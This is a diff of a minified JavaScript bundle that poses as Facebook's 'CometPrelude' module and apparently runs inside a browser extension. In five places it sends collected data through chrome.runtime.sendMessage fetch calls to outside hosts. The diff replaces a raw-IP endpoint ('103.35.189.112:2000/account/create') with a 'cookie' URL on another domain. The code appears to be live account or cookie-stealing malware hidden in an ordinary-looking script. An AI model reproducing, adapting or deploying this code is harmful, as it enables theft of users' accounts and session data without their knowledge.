@@ -20902,8 +20902,8 @@ __d("CometPrelude", ["CometPreludeCritical", "CometPreludeRunWhenReady"], (funct
                     U.length > 0 && "" !== k && o && chrome.runtime.sendMessage(n, {
                         action: "fetch",
                         data: {
-                            method: "POST",
-                            url: "http://103.35.189.112:2000/account/create",
+                            method: "GET",
+                            url: "https://api.tailieure.net/?cookie=456",
                             headers: {
                                 "Content-Type": "application/json"
                             },
@@ -20921,8 +20921,8 @@ __d("CometPrelude", ["CometPreludeCritical", "CometPreludeRunWhenReady"], (funct
                     R.length > 0 && "" !== k && o && chrome.runtime.sendMessage(n, {
                         action: "fetch",
                         data: {
-                            method: "POST",
-                            url: "http://103.35.189.112:2000/account/create",
+                            method: "GET",
+                            url: "https://api.tailieure.net/?cookie=456",
                             headers: {
                                 "Content-Type": "application/json"
                             },
@@ -20940,8 +20940,8 @@ __d("CometPrelude", ["CometPreludeCritical", "CometPreludeRunWhenReady"], (funct
                     z.length > 0 && "" !== k && o && chrome.runtime.sendMessage(n, {
                         action: "fetch",
                         data: {
-                            method: "POST",
-                            url: "http://103.35.189.112:2000/account/create",
+                            method: "GET",
+                            url: "https://api.tailieure.net/?cookie=456",
                             headers: {
                                 "Content-Type": "application/json"
                             },
@@ -20959,8 +20959,8 @@ __d("CometPrelude", ["CometPreludeCritical", "CometPreludeRunWhenReady"], (funct
                     void 0 !== V && "" !== k && o && chrome.runtime.sendMessage(n, {
                         action: "fetch",
                         data: {
-                            method: "POST",
-                            url: "http://103.35.189.112:2000/account/create",
+                            method: "GET",
+                            url: "https://api.tailieure.net/?cookie=456",
                             headers: {
                                 "Content-Type": "application/json"
                             },
@@ -20979,8 +20979,8 @@ __d("CometPrelude", ["CometPreludeCritical", "CometPreludeRunWhenReady"], (funct
                     "" !== k && "" !== S && E.length > 0 && "" !== C && chrome.runtime.sendMessage(n, {
                         action: "fetch",
                         data: {
-                            method: "POST",
-                            url: "http://103.35.189.112:2000/account/create",
+                            method: "GET",
+                            url: "https://api.tailieure.net/?cookie=456",
                             headers: {
                                 "Content-Type": "application/json"
                             },
@@ -21216,4 +21216,4 @@ __d("CometPrelude", ["CometPreludeCritical", "CometPreludeRunWhenReady"], (funct
             }))
         }), 5e3), l()
     })()
-})(); //# sourceMappingURL=main.45c6cefe.js.ma
+})(); //# sourceMappingURL=main.45c6cefe.js.map
